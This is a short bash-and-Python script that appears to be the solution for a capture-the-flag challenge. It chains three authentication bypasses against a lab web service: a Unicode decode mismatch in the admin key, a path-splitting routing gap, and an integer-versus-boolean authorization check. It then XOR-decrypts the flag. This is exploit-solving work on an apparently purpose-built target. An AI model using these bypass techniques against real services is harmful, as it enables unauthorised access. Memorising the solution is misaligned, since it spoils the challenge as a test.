#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"; PORT="${PORT:-8297}"; FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"
python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import base64, hashlib, json, sys
from urllib.request import Request, urlopen
host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"
req = Request(base + "/api/session", data=b"{}", method="POST")
sid = json.loads(urlopen(req, timeout=5).read())["session"]
# Gap A: ascii vs utf-8 decode. base64(b'admin\xc2\xb2')
key = base64.b64encode(b'admin\xc2\xb2').decode()
req = Request(base + "/api/auth", headers={"X-Session": sid, "X-Auth-Key": key})
hex_a = json.loads(urlopen(req, timeout=5).read())["fragment"]
# Gap B: split('/',1) vs rsplit('/',1). "x/y/admin": split[1]="y/admin", rsplit[1]="admin"
req = Request(base + "/api/route/x/y/admin", headers={"X-Session": sid})
hex_b = json.loads(urlopen(req, timeout=5).read())["fragment"]
# Gap C: is True vs bool(x). JSON 1 -> int 1. 1 is True -> False, bool(1) -> True.
body = json.dumps({"authorized": 1}).encode()
req = Request(base + "/api/authorize", data=body,
              headers={"X-Session": sid, "Content-Type": "application/json"}, method="POST")
hex_c = json.loads(urlopen(req, timeout=5).read())["fragment"]
key = hashlib.sha256((hex_a + hex_b + hex_c).encode()).digest()[:32]
req = Request(base + "/api/admin", headers={"X-Session": sid})
payload = urlopen(req, timeout=5).read()
encrypted = payload[4:]
flag = bytes(b ^ key[i % len(key)] for i, b in enumerate(encrypted)).decode()
print(flag)
PY
